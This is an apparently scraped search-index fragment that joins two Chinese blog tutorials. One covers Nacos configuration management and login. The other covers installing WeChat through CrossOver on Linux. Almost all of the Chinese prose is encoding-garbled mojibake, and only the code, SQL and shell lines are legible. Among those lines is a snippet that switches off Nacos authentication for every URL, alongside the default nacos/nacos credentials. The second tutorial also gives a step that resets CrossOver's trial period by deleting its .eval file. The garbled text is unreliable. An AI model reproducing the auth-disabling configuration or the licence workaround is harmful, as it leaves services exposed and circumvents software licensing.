å¸¸è§é…ç½®ç®¡ç†æ“ä½œé…ç½®é›†å¯¼å‡ºå‹¾é€‰è‹¥å¹²é…ç½®é›†ï¼Œç‚¹å‡»å¯¼å‡ºé€‰ä¸­çš„é…ç½®æŒ‰é’®ï¼Œå³å¯è‡ªåŠ¨ä¸‹è½½ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…å†…åŒ…å«äº†é€‰ä¸­é…ç½®é›†æ‰€è½¬æ¢çš„é…ç½®æ–‡ä»¶ã€‚ é…ç½®é›†å¯¼å…¥ç‚¹å‡»å³ä¸Šè§’çš„å¯¼å…¥é…ç½®æŒ‰é’®ï¼Œé€‰æ‹©ä¹‹å‰å¯¼å‡ºçš„é…ç½®æ–‡ä»¶å‹ç¼©åŒ…ï¼Œå¯ä»¥å°†å‹ç¼©åŒ…å†…çš„æ–‡ä»¶æ¢å¤ä¸º Nacos é…ç½®é›†ã€‚ é…ç½®é›†å…‹éš†å‹¾é€‰è‹¥å¹²é…ç½®é›†ï¼Œç‚¹å‡»å…‹éš†æŒ‰é’®ï¼Œå¯ä»¥å°†é€‰ä¸­çš„é…ç½®é›†æ‰¹é‡å¤åˆ¶åˆ°æŒ‡å®šçš„å‘½åç©ºé—´å†…ã€‚ å†å²ç‰ˆæœ¬Nacos é€šè¿‡æä¾›é…ç½®ç‰ˆæœ¬ç®¡ç†åŠå…¶ä¸€é”®å›æ»šèƒ½åŠ›ï¼Œå¸®åŠ©ç”¨æˆ·æ”¹é”™é…ç½®çš„æ—¶å€™èƒ½å¤Ÿå¿«é€Ÿå›æ»šï¼Œé™ä½å¾®æœåŠ¡ç³»ç»Ÿåœ¨é…ç½®ç®¡ç†ä¸Šçš„å¯ç”¨æ€§é£é™©ã€‚ ç›‘å¬æŸ¥è¯¢Nacos æä¾›é…ç½®è®¢é˜…è€…ï¼ˆå³ç›‘å¬è€…ï¼‰æŸ¥è¯¢èƒ½åŠ›ï¼ŒåŒæ—¶æä¾›å®¢æˆ·ç«¯å½“å‰é…ç½®çš„ MD5 æ ¡éªŒå€¼ï¼Œä»¥ä¾¿å¸®åŠ©ç”¨æˆ·æ›´å¥½çš„æ£€æŸ¥æœåŠ¡å™¨çš„é…ç½®å˜æ›´æ˜¯å¦æ¨é€åˆ° Nacos å®¢æˆ·ç«¯ï¼Œå…¶ä¸­ Nacos å®¢æˆ·ç«¯ç›‘å¬çš„ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839import com.alibaba.nacos.api.NacosFactory;import com.alibaba.nacos.api.config.ConfigService;import com.alibaba.nacos.api.config.listener.Listener;import com.alibaba.nacos.api.exception.NacosException;import java.io.IOException;import java.util.Properties;import java.util.concurrent.Executor;/** * Nacoså®¢æˆ·ç«¯ç›‘å¬æœåŠ¡å™¨çš„é…ç½®ä¿¡æ¯æ˜¯å¦å˜æ›´ * @author clay */public class NacosDemoApplicaton { public static void main(String[] args) throws NacosException, IOException { String serverAddr = "127.0.0.1:8848"; String group = "DEFAULT_GROUP"; String dataId = "nacos_simple_demo.yaml"; Properties properties = new Properties(); properties.put("serverAddr", serverAddr); ConfigService configService = NacosFactory.createConfigService(properties); String content = configService.getConfig(dataId, group, 1000); System.out.println(content); configService.addListener(dataId, group, new Listener() { @Override public Executor getExecutor() { return null; } @Override public void receiveConfigInfo(String configInfo) { System.out.println(configInfo); } }); System.in.read(); }} ç™»å½•ç®¡ç†Nacos æ”¯æŒç®€å•çš„ç™»å½•åŠŸèƒ½ï¼Œé»˜è®¤ç”¨æˆ·å / å¯†ç ä¸ºï¼š nacos/nacosï¼Œ ç”Ÿæˆå¯†ç  12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.security&lt;/groupId&gt; &lt;artifactId&gt;spring-security-core&lt;/artifactId&gt; &lt;version&gt;5.4.1&lt;/version&gt;&lt;/dependency&gt; 1234567891011/** * ç”±äºé‡‡ç”¨BCryptåŠ å¯†æ–¹æ³•åœ¨æ¯æ¬¡ç”Ÿæˆå¯†ç æ—¶ä¼šåŠ éšæœºç›ï¼Œå› æ­¤ç”Ÿæˆçš„å¯†ç æ¯æ¬¡éƒ½å¯èƒ½ä¸ä¸€æ · * @author clay */public class PasswordEncoderUtil { public static void main(String[] args) { String password = new BCryptPasswordEncoder().encode("123456"); System.out.println(password); }} åˆ›å»ºç™»å½•ç”¨æˆ· å½“ Nacos ä½¿ç”¨ MySQL æ•°æ®åº“å­˜å‚¨æ•°æ®æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ SQL æ¥åˆ›å»ºæ–°ç”¨æˆ·ï¼Œå…¶ä¸­å¯†ç å°±æ˜¯ä¸Šé¢é€šè¿‡ Java ä»£ç ç”Ÿæˆçš„å­—ç¬¦ä¸²ã€‚åŒç†ï¼Œè‹¥éœ€è¦æ›´æ”¹æ—§ç”¨æˆ·çš„ç™»å½•å¯†ç ï¼Œåªéœ€è¦é€šè¿‡ SQL æ›´æ–°å¯¹åº”çš„æ•°æ®åº“è¡¨æ•°æ®å³å¯ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ 12INSERT INTO users (username, password, enabled) VALUES (\'admin\',\'$2a$10$kCRcD31fYzYUhfvCSUqQ9u/IAKbq4yTWi1z3l6kTrKL5exGSNbSUK\', TRUE);INSERT INTO roles (username, role) VALUES (\'admin\', \'ROLE_ADMIN\'); å…³é—­ç™»å½•åŠŸèƒ½ç”±äºéƒ¨åˆ†å…¬å¸è‡ªå·±å¼€å‘æ§åˆ¶å°ï¼Œä¸å¸Œæœ›è¢« Nacos çš„å®‰å…¨ Filter æ‹¦æˆªã€‚å› æ­¤ Nacos æ”¯æŒå®šåˆ¶å…³é—­ç™»å½•åŠŸèƒ½ï¼Œåªéœ€è¦æ‰¾åˆ°é…ç½®æ–‡ä»¶ ${nacos-home}/conf/application.propertiesï¼Œæ›¿æ¢ä»¥ä¸‹å†…å®¹å³å¯ï¼Œæœ€åé‡å¯ Nacos æœåŠ¡ä½¿æ›´æ”¹ç”Ÿæ•ˆã€‚ç‰¹åˆ«æ³¨æ„ï¼Œä»¥ä¸‹æ›´æ”¹åªé€‚åˆ Nacos 1.2.0 ä»¥ä¸‹çš„ç‰ˆæœ¬ã€‚ 123456spring.security.enabled=falsemanagement.security=falsesecurity.basic.enabled=falsenacos.security.ignore.urls=/**# nacos.security.ignore.urls=/,/error,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.ico,/console-fe/public/**,/v1/auth/**,/v1/console/health/**,/actuator/**,/v1/console/server/** ä¸‹ç¯‡ - Nacos å…¥é—¨æ•™ç¨‹ - é…ç½®ç®¡ç†ï¼ˆä¸­çº§ç¯‡ï¼‰ Nacos å…¥é—¨æ•™ç¨‹ - é…ç½®ç®¡ç†ä¸­çº§ç¯‡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"CrossOver å®‰è£…å¾®ä¿¡ï¼ˆWeChatï¼‰",url:"/posts/a1930361.html",text:'å‰è¨€ç¬”è€…æ›¾åœ¨æ–‡ç« â€CentOS 7 å®‰è£…å¸¸ç”¨æ¡Œé¢è½¯ä»¶ â€œä¸­ï¼Œæ¨èä½¿ç”¨ electronic-wechat ä½œä¸º Linux å¾®ä¿¡å®¢æˆ·ç«¯ï¼Œå¯æƒœåœ¨ CentOS 7 ç¯å¢ƒä¸‹çš„é•¿æœŸä½¿ç”¨ä½“éªŒæ¯”è¾ƒä¸€èˆ¬ï¼Œä¾‹å¦‚æ¥æ”¶åˆ°æ¶ˆæ¯æ—¶æ— å£°éŸ³æç¤ºï¼Œä¸”å¾®ä¿¡çš„æ‰˜ç›˜å›¾æ ‡ä¸ä¼šé—ªçƒï¼ŒåŒæ—¶ç”±äº electronic-wechat æ˜¯åœ¨ Web ç‰ˆå¾®ä¿¡çš„åŸºç¡€ä¸Šå¼€å‘çš„ï¼Œè¿™å°±å¯¼è‡´æ–°æ³¨å†Œçš„å¾®ä¿¡è´¦å·ç™»å½•å—é™ï¼Œæœ€ç»ˆæ— æ³•ä½¿ç”¨ã€‚ç»è¿‡ä¸€ç•ªå°è¯•ï¼Œå‘ç° CrossOver å¯ä»¥è¿‘ä¹å®Œç¾åœ°å®‰è£…å¾®ä¿¡ï¼Œè€Œä¸”è¿è¡Œçš„æ˜¯å¾®ä¿¡å®˜æ–¹åŸç”Ÿçš„äºŒè¿›åˆ¶æ‰§è¡Œæ–‡ä»¶ã€‚æœ¬æ•™ç¨‹é€‚ç”¨äº Debian/Ubuntu/CentOS ç³»çš„ Linux å‘è¡Œç‰ˆï¼Œæ–‡ç« æœ«å°¾é™„æœ‰å¾®ä¿¡è¿è¡Œçš„æœ€ç»ˆæ•ˆæœå›¾ã€‚ è½¯ä»¶ç‰ˆæœ¬è¯´æ˜ CrossOverï¼š 19.0.0 å¾®ä¿¡ PC å®¢æˆ·ç«¯ï¼š 2.7.1.88 CrossOver å®¹å™¨ï¼š WinXp-64-bit Linux ç³»ç»Ÿçš„è¾“å…¥æ³•ï¼šæœç‹—è¾“å…¥æ³• For Linux 2.2.0.0108 CrossOver å®‰è£…è¿è¡Œå¾®ä¿¡é‡åˆ°çš„å‘CrossOver å®‰è£…å¾®ä¿¡çš„è¿‡ç¨‹ä¸­å¯èƒ½é‡åˆ°äº†ä»¥ä¸‹é—®é¢˜ï¼Œæœ¬æ–‡åé¢ä¼šè¯¦ç»†ä¸€ä¸€ç»™å‡ºå¯¹åº”çš„è§£å†³æ–¹æ³•ï¼š å¾®ä¿¡å¯åŠ¨æ—¶å¶å°”å´©æºƒ å¯åŠ¨å¾®ä¿¡æç¤º WeChatWin.dll æ–‡ä»¶ç¼ºå¤± å¾®ä¿¡çš„è¾“å…¥æ¡†æ— æ³•æ˜¾ç¤ºå…‰æ ‡ä¸æ–‡å­—ï¼Œåªèƒ½å¤åˆ¶é»è´´ å¾®ä¿¡å±å¹•æˆªå›¾åï¼Œæ— æ³•ç›´æ¥å‘é€å›¾ç‰‡ å¾®ä¿¡çš„è¾“å…¥æ¡†æ— æ³•ä½¿ç”¨æœç‹—è¾“å…¥æ³•ï¼ˆLinux ç‰ˆï¼‰è¾“å…¥ä¸­æ–‡ Linux å®‰è£… CrossOverCrossOver æ”¯æŒ Ubuntuã€Mintã€Debian ä½¿ç”¨ deb åŒ…å®‰è£…ï¼Œæ”¯æŒ Fedoraã€RHEL ä½¿ç”¨ rpm åŒ…å®‰è£…ï¼Œæ”¯æŒå…¶ä»–å‘è¡Œç‰ˆï¼ˆä¾‹å¦‚ CentOSï¼‰ä½¿ç”¨ bin å®‰è£…åŒ…å®‰è£…ã€‚CrossOver çš„å®‰è£…æ¯”è¾ƒç®€å•ï¼Œæ­¤å¤„ä¸å†ç´¯è¿°ï¼Œå¯å‚è€ƒâ€ å®˜æ–¹å®‰è£…æ•™ç¨‹ â€œã€‚æ¨èä½¿ç”¨ root ç”¨æˆ·è¿›è¡Œå®‰è£…ï¼Œè‹¥å®‰è£…è¿‡ç¨‹ä¸­è‡ªå®šä¹‰äº† CrossOver çš„å®‰è£…è·¯å¾„ï¼Œåˆ™éœ€è¦æ–°å¢ç¯å¢ƒå˜é‡æ¥æŒ‡å®š CrossOver çš„å®‰è£…è·¯å¾„ï¼Œå¦åˆ™ CrossOver éƒ¨åˆ†å‘½ä»¤å°†æ— æ³•ä½¿ç”¨ã€‚ 123456# æ·»åŠ ç¯å¢ƒå˜é‡ï¼ŒæŒ‡å®šCrossOverçš„è‡ªå®šä¹‰å®‰è£…è·¯å¾„# vim /etc/profileexport CX_ROOT=/usr/local/cxoffice# ä½¿é…ç½®ç”Ÿæ•ˆ# source /etc/profile CrossOver å®‰è£…å¾®ä¿¡ä»å¾®ä¿¡å®˜ç½‘ä¸‹è½½ PC ç‰ˆçš„å¾®ä¿¡å®¢æˆ·ç«¯åï¼Œå¯å‚è€ƒâ€CrossOver å¦‚ä½•å®‰è£…æœªçŸ¥åº”ç”¨ç¨‹åº â€œé‡Œçš„æ­¥éª¤ï¼Œåœ¨ CrossOver ä¸Šå®‰è£…åŸç”Ÿçš„å¾®ä¿¡ PC å®¢æˆ·ç«¯ã€‚ (adsbygoogle = window.adsbygoogle || []).push({}); è§£å†³å¾®ä¿¡è¿è¡Œåå‡ºç°çš„å„ç§é—®é¢˜å¾®ä¿¡å¯åŠ¨æ—¶å¶å°”å´©æºƒå¾®ä¿¡éœ€è¦è¿è¡Œåœ¨ CrossOver çš„ WinXp-64-bit å®¹å™¨ä¸­ï¼Œå¦åˆ™å¾®ä¿¡å¯åŠ¨æ—¶å¯èƒ½ä¼šå´©æºƒã€‚ å¾®ä¿¡å±å¹•æˆªå›¾åï¼Œæ— æ³•ç›´æ¥å‘é€å›¾ç‰‡å¾®ä¿¡å±å¹•æˆªå›¾ï¼Œå¦‚æœæŒ‰â€ é’©â€ ç¡®å®šæˆªå›¾å®Œæˆï¼Œé‚£ä¹ˆæˆªå›¾å°†åˆ™ç›´æ¥æ¶ˆå¤±ï¼Œä¸ä¼šå°†å›¾ç‰‡æ˜¾ç¤ºåˆ°è¾“å…¥æ¡†é‡Œï¼Œå¯¼è‡´æ— æ³•ç›´æ¥å‘é€å›¾ç‰‡ã€‚å»ºè®®æˆªå›¾å®Œæˆåä¿å­˜å›¾ç‰‡åˆ°æœ¬åœ°ï¼Œå†ä»æœ¬åœ°å°†å›¾ç‰‡æ‹–æ‹½åˆ°è¾“å…¥æ¡†é‡Œï¼Œè¿™æ ·å°±å¯ä»¥æ­£å¸¸å‘é€å›¾ç‰‡äº†ã€‚å¼ºçƒˆæ¨èä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„æˆªå›¾å·¥å…·æˆ–è€…ç¬¬ä¸‰æ–¹æˆªå›¾å·¥å…·ï¼ˆä¾‹å¦‚ Shutterï¼‰æ›¿ä»£å¾®ä¿¡çš„æˆªå›¾åŠŸèƒ½ï¼Œå› ä¸ºå¯ä»¥å°†ç²˜è´´æ¿é‡Œçš„å›¾ç‰‡ç›´æ¥ç²˜è´´åˆ°å¾®ä¿¡çš„è¾“å…¥æ¡†é‡Œã€‚ å¯åŠ¨å¾®ä¿¡æç¤º WeChatWin.dll æ–‡ä»¶ç¼ºå¤±åŸå› æ˜¯ Linux ç³»ç»Ÿç¼ºå°‘ lib32-libldap ä¾èµ–åº“ï¼Œå¯¼è‡´ CrossOver æ— æ³•åŠ è½½ç‰¹å®šçš„ dll æ–‡ä»¶ï¼Œå®‰è£…ä¸Šå¯¹åº”çš„ä¾èµ–åº“åï¼Œé‡å¯å¾®ä¿¡å®¢æˆ·ç«¯å³å¯ã€‚ 12345# é€‚ç”¨ç³»ç»Ÿï¼šDebian/Ubuntu/Mint# apt-get install -y libldap-2.4-2:i386# é€‚ç”¨ç³»ç»Ÿï¼šFedora/RHEL/CentOS# yum install -y compat-openldap.i686 openldap.i686 openldap-devel.i686 compat-openldap.x86_64 openldap.x86_64 openldap-devel.x86_64 å¾®ä¿¡è¾“å…¥æ¡†æ— æ³•æ˜¾ç¤ºå…‰æ ‡ä¸æ–‡å­—ï¼Œåªèƒ½å¤åˆ¶é»è´´ä¸‹è½½ Windows ç‰ˆçš„ riched20.dll åŠ¨æ€é“¾æ¥åº“ï¼ˆå¿…é¡»æ˜¯è¿™ä¸ªç‰ˆæœ¬ï¼‰ï¼Œç„¶åå°†ä¸‹è½½å¾—åˆ°çš„ riched20.dll æ–‡ä»¶æ‹·è´åˆ° CrossOver å®¹å™¨å¯¹åº”çš„ system32ã€syswow64ï¼ˆé‡ç‚¹ï¼‰ ç›®å½•ä¸‹ï¼Œå³è¦†ç›–æ‰ CrossOver å®¹å™¨å†…çš„ riched20.dll æ–‡ä»¶ã€‚ä¾‹å¦‚å½“ CrossOver å®¹å™¨çš„åç§°ä¸º WinXp-64-bitï¼Œé‚£ä¹ˆåˆ™éœ€è¦å°† Windows ç‰ˆçš„ riched20.dll æ‹·è´åˆ° ~/.cxoffice/WinXp-64-bit/drive_c/windows/system32 å’Œ ~/.cxoffice/WinXp-64-bit/drive_c/windows/syswow64 ç›®å½•ä¸‹ï¼Œæ‹·è´å®Œæˆåé‡å¯å¾®ä¿¡å®¢æˆ·ç«¯ã€‚ å¾®ä¿¡è¾“å…¥æ¡†æ— æ³•ä½¿ç”¨æœç‹—è¾“å…¥æ³•ï¼ˆLinux ç‰ˆï¼‰è¾“å…¥ä¸­æ–‡å¦‚æœåœ¨ Linux ç³»ç»Ÿå†…ï¼Œå·²ç»å®‰è£…äº† Linux ç‰ˆçš„æœç‹—è¾“å…¥æ³•ï¼Œä½†æ— æ³•åœ¨å¾®ä¿¡çš„è¾“å…¥æ¡†å†…è¾“å…¥ä¸­æ–‡ï¼Œè¿™å¯èƒ½æ˜¯ç³»ç»Ÿç¼ºå°‘äº†è¾“å…¥æ³•çš„ç¯å¢ƒå˜é‡é…ç½®ä¿¡æ¯å¯¼è‡´çš„ã€‚Crossover çš„åº”ç”¨å¿«æ·æ–¹å¼æ–‡ä»¶é»˜è®¤å­˜æ”¾åœ¨ ~/.local/share/applications/ æ–‡ä»¶å¤¹ä¸­ï¼Œä»ä¸­æ‰¾åˆ° xxxå¾®ä¿¡xxx.desktop æ–‡ä»¶ï¼Œç„¶ååœ¨ desktop æ–‡ä»¶ä¸­æ‰¾åˆ° lnk æ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åä½¿ç”¨ç¼–è¾‘å™¨æ·»åŠ ç›¸å…³é…ç½®ä¿¡æ¯åˆ° lnk æ–‡ä»¶ä¸­ï¼Œå®Œæˆåé‡å¯å¾®ä¿¡å®¢æˆ·ç«¯ã€‚ 123456789101112# æŸ¥çœ‹å¾®ä¿¡çš„åº”ç”¨å¿«æ·æ–¹å¼æ–‡ä»¶# cat ~/.local/share/applications/cxmenu-cxoffice-955d8f89-fd24-4c49-addb-5dc0e8a63a1e-2l9ih12-å¾®ä¿¡.desktop# æ‰¾åˆ°è¿™è¡Œå†…å®¹ï¼šExec="/home/xxxx/.cxoffice/WinXp-64-bit/desktopdata/cxmenu/StartMenu.C^5E3A_ProgramData_Microsoft_Windows_Start^2BMenu/Programs/å¾®ä¿¡/å¾®ä¿¡.lnk" %u# ç¼–è¾‘lnkæ–‡ä»¶ï¼Œåœ¨ #!/bin/sh ä¹‹åå’Œ exec ä¹‹å‰æ·»åŠ ä»¥ä¸‹ç¯å¢ƒå˜é‡é…ç½®# vim /home/xxxx/.cxoffice/WinXp-64-bit/desktopdata/cxmenu/StartMenu.C^5E3A_ProgramData_Microsoft_Windows_Start^2BMenu/Programs/å¾®ä¿¡/å¾®ä¿¡.lnkexport XIM=fcitxexport GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport QT4_IM_MODULE=fcitxexport XMODIFIERS="@im=fcitx" CrossOver å®‰è£…å°å°ä¸­æ–‡è¾“å…¥æ³•è‹¥ä¸Šé¢é…ç½®äº†è¾“å…¥æ³•çš„ç¯å¢ƒå˜é‡ï¼Œä¾ç„¶æ— æ³•è§£å†³å¾®ä¿¡ä¸­æ–‡è¾“å…¥çš„é—®é¢˜ï¼Œæ­¤æ—¶å¯å°†å°å°è¾“å…¥æ³•å®‰è£…åˆ°ä¸å¾®ä¿¡åŒä¸€ CrossOver å®¹å™¨ä¹‹ä¸‹ï¼Œå®‰è£…åå¯ä»¥ä½¿ç”¨è¯¥è¾“å…¥æ³•è¾“å…¥ä¸­æ–‡ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒCrossOver å®‰è£…å°å°è¾“å…¥æ³•çš„æ–¹æ³•å’Œä¸Šé¢ CrossOver å®‰è£…å¾®ä¿¡çš„æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œç‚¹å‡»æ­¤å¤„å¯ä»æœ¬ç«™ä¸‹è½½å°å°è¾“å…¥æ³•ï¼ˆV2.5.0-0ï¼‰çš„ EXE å®‰è£…æ–‡ä»¶ã€‚ å°å°ä¸­æ–‡è¾“å…¥æ³•çš„å®‰è£…æ³¨æ„äº‹é¡¹ å°å°è¾“å…¥æ³•å®‰è£…å®Œæˆåï¼Œä¸è¦å‹¾é€‰â€ è¿è¡Œå°å°è¾“å…¥æ³•â€ï¼Œç›´æ¥ç‚¹å‡»â€ å®Œæˆâ€ æŒ‰é’®å³å¯ï¼Œå¦åˆ™ CrossOver çš„å®‰è£…ç¨‹åºä¼šä¸€ç›´è¿è¡Œï¼Œé™¤éç‚¹å‡»èœå•æ çš„æ‰˜ç›˜å›¾æ ‡æ‰‹åŠ¨é€€å‡ºå°å°è¾“å…¥æ³• å°å°è¾“å…¥æ³•å®‰è£…å®Œæˆåï¼Œå®¹å™¨ä¸ä¼šå‡ºç°å°å°è¾“å…¥æ³•çš„å¯åŠ¨å¿«æ·æ–¹å¼ï¼Œå³åœ¨åº”ç”¨ç¨‹åºåˆ—è¡¨ä¸­æ— æ³•ç›´æ¥é€šè¿‡ç‚¹å‡»å›¾æ ‡çš„æ–¹å¼æ¥å¯åŠ¨è¾“å…¥æ³•ï¼Œä½†å¯ä»¥å‚ç…§ä»¥ä¸‹æ–¹æ³•æ‰‹åŠ¨åˆ›å»ºå°å°è¾“å…¥æ³•çš„å¯åŠ¨å¿«æ·æ–¹å¼ ç”±äºåœ¨å®¹å™¨ä¸­çš„ c:/Program Files (x86)/yong/ ç›®å½•ä¸‹å·²ç»æœ‰äº†å®‰è£…åçš„æ–‡ä»¶å¤¹ï¼Œå› æ­¤å¯ä»¥åœ¨å®¹å™¨ä¸­é€šè¿‡ "è¿è¡Œå‘½ä»¤" çš„åŠŸèƒ½ï¼Œæ‰‹åŠ¨åˆ›å»ºå°å°è¾“å…¥æ³•çš„å¿«æ·æ–¹å¼æˆ–è€…è¾“å…¥å‘½ä»¤ /home/xxxx/.cxoffice/WinXp-64-bit/dosdevices/c:/Program Files (x86)/yong/yong.exe æ¥ç›´æ¥è¿è¡Œå°å°è¾“å…¥æ³•ï¼Œå…¶ä¸­åˆ›å»ºå°å°è¾“å…¥æ³•å¿«æ·æ–¹å¼çš„æ­¥éª¤å¦‚ä¸‹å›¾ï¼š å°å°ä¸­æ–‡è¾“å…¥æ³•çš„ä½¿ç”¨æ³¨æ„äº‹é¡¹ é€šè¿‡ CrossOver å®‰è£…çš„ç¨‹åºä½¿ç”¨å°å°è¾“å…¥æ³•åä¸å®¿ä¸»æœºä¸Šå®‰è£…çš„è¾“å…¥æ³•æ˜¯äº’ä¸å¹²æ‰°çš„ï¼Œä¸¤è€…éƒ½å¯ä»¥ç‹¬ç«‹æ­£å¸¸ä½¿ç”¨ å°å°è¾“å…¥æ³•ä¸­è‹±æ–‡åˆ‡æ¢çš„é»˜è®¤å¿«æ·é”®æ˜¯å·¦è¾¹çš„ Ctrl é”®ï¼Œæ”¯æŒè‡ªå®šä¹‰è¾“å…¥æ³•çš„å¿«æ·é”® å°å°è¾“å…¥æ³•æ¯æ¬¡éƒ½éœ€è¦æ‰‹åŠ¨å¯åŠ¨ï¼Œä¸”é¦–æ¬¡ä½¿ç”¨éœ€è¦é€šè¿‡å°å°è¾“å…¥æ³•åœ¨èœå•æ ä¸Šçš„æ‰˜ç›˜å›¾æ ‡åˆ‡æ¢åˆ°æ‹¼éŸ³è¾“å…¥æ³• è‹¥å·²ç»é€šè¿‡èœå•æ çš„æ‰˜ç›˜å›¾æ ‡åˆ‡æ¢åˆ°æ‹¼éŸ³è¾“å…¥æ³•ï¼Œä½†åœ¨å¾®ä¿¡è¾“å…¥æ¡†ä¸­ä¾ç„¶æ— æ³•è¾“å…¥ä¸­æ–‡ï¼Œæ­¤æ—¶å¯ä»¥å•å‡»èœå•æ ä¸Šçš„æ‰˜ç›˜å›¾æ ‡ï¼Œç›´è‡³å³ä¸‹è§’å‡ºç°å°å°è¾“å…¥æ³•çš„çŠ¶æ€æ ï¼Œç„¶åå†å°è¯•è¾“å…¥ä¸­æ–‡ è‹¥ä¸Šé¢çš„æ–¹æ³•éƒ½æ— æ³•ä½¿ç”¨å°å°è¾“å…¥æ³•è¾“å…¥ä¸­æ–‡ï¼Œæ­¤æ—¶è¯•è¯•é‡å¯è¾“å…¥æ³•ï¼Œç„¶åå†å¤šè¯•å‡ æ¬¡ å»ºè®®å…ˆå¯åŠ¨å°å°è¾“å…¥æ³•ï¼Œç„¶åå†å¯åŠ¨å¾®ä¿¡åº”ç”¨ å¾®ä¿¡è¿è¡Œçš„æœ€ç»ˆæ•ˆæœå›¾ å¸¸è§é—®é¢˜å¾®ä¿¡ç‰ˆæœ¬å‡çº§è‹¥éœ€è¦å‡çº§å¾®ä¿¡çš„ç‰ˆæœ¬ï¼Œé¦–å…ˆåœ¨å®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆå¾®ä¿¡ PC å®¢æˆ·ç«¯çš„äºŒè¿›åˆ¶æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åé€šè¿‡ UI ç•Œé¢å¸è½½ CrossOver å®¹å™¨é‡Œçš„æ—§ç‰ˆå¾®ä¿¡ï¼Œæœ€ååœ¨å®¹å™¨é‡Œå®‰è£…æœ€æ–°ç‰ˆçš„å¾®ä¿¡ PC å®¢æˆ·ç«¯å³å¯ã€‚ CrossOver è¯•ç”¨æœŸå·²è¿‡CrossOver é»˜è®¤è¯•ç”¨æ—¶é—´ä¸º 15 å¤©ï¼Œåœ¨ Linux ç³»ç»Ÿä¸‹ï¼Œå¦‚æœ 15 å¤©è¿‡åè¿˜æƒ³ç»§ç»­è¯•ç”¨ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œè¿›è¡Œç ´è§£ã€‚CrossOver çš„è¯•ç”¨æ—¶é—´éªŒè¯ä¿¡æ¯æ˜¯å†™åœ¨æ¯ä¸€ä¸ª winebottle å®¹å™¨ä¸­çš„ï¼ˆå…¶æœ¬è´¨å°±æ˜¯åœ¨å®¹å™¨æ‰€åœ¨ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶äº†åç§°ä¸º .eval çš„éšè—æ–‡ä»¶ ï¼‰ï¼Œä¸åŒå®¹å™¨ä¹‹é—´æ˜¯å®Œå…¨éš”ç¦»çš„ï¼ˆä¸æ˜¯å†™åœ¨å…¨å±€é…ç½®ä¸­ï¼‰ã€‚å³ä½¿ä¸€ä¸ªå·²ä½¿ç”¨çš„å®¹å™¨è¿‡æœŸäº†ï¼Œä¾ç„¶å¯ä»¥åˆ›å»ºæ–°çš„å®¹å™¨ï¼Œå¹¶é‡æ–°è®¡ç®—è¯•ç”¨æœŸï¼Œæ‰€ä»¥ä¸éœ€è¦é‡è£… CrossOver è½¯ä»¶ã€‚ 12# åˆ é™¤.evalæ–‡ä»¶$ rm ~/.cxoffice/å®¹å™¨åç§°/.eval å®‰è£…å…¶ä»– Windows åŸç”Ÿåº”ç”¨åœ¨ Linux ç¯å¢ƒä¸‹ï¼Œè‹¥éœ€è¦å®‰è£… QQã€TIMã€è¿…é›·ã€Office ç­‰å…¶ä»–ä¸»æµçš„ Windows åº”ç”¨ï¼Œå¯ä»¥å‚è€ƒä¸Šé¢ CrossOver å®‰è£…å¾®ä¿¡ PC å®¢æˆ·ç«¯çš„è¿‡ç¨‹ï¼›å› ä¸ºå®‰è£…æ­¥éª¤åŸºæœ¬éƒ½æ˜¯å¤§åŒå°å¼‚çš„ï¼Œé‡ç‚¹åœ¨äºç»†èŠ‚é—®é¢˜çš„è§£å†³ã€‚ Linux å®‰è£…å¾®ä¿¡çš„å¯é€‰æ–¹æ¡ˆæ€»ç»“ è…¾è®¯å®˜æ–¹ Web ç‰ˆå¾®ä¿¡ Franz + å¾®ä¿¡ï¼ˆåŸºäº Web ç‰ˆï¼‰ Electronic-Wechatï¼ˆåŸºäº Web ç‰ˆï¼‰ è™šæ‹Ÿæœº + å¾®ä¿¡åŸç”Ÿ PC å®¢æˆ·ç«¯ CrossOver + å¾®ä¿¡åŸç”Ÿ PC å®¢æˆ·ç«¯ Winetricksï¼ˆåŸºäº Wineï¼‰ + å¾®ä¿¡åŸç”Ÿ PC å®¢æˆ·ç«¯ Winetricks-ZHï¼ˆåŸºäº Wineï¼‰ + å¾®ä¿¡åŸç”Ÿ PC å®¢æˆ·ç«¯ AppImage + AppImage æ‰“åŒ…æ„å»ºçš„ï¼ˆWine + å¾®ä¿¡åŸç”Ÿ PC å®¢æˆ·ç«¯ï¼‰ Flatpak + Flatpak æ‰“åŒ…æ„å»ºçš„ï¼ˆDeepin-Wine + å¾®ä¿¡åŸç”Ÿ PC å®¢æˆ·ç«¯ï¼‰ Wine + PlayonLinux + å¾®ä¿¡åŸç”Ÿ PC å®¢æˆ·ç«¯ å‚è€ƒåšå®¢ åœ¨ Ubuntu ä¸­ä½¿ç”¨ TIM å’Œå¾®ä¿¡ Linux ä¸‹çš„ Wine ç”Ÿæ´»ï¼ˆQQã€å¾®ä¿¡ã€Officeï¼‰ Linux ä¸Šæœ‰ä»€ä¹ˆå¥½çš„ QQ 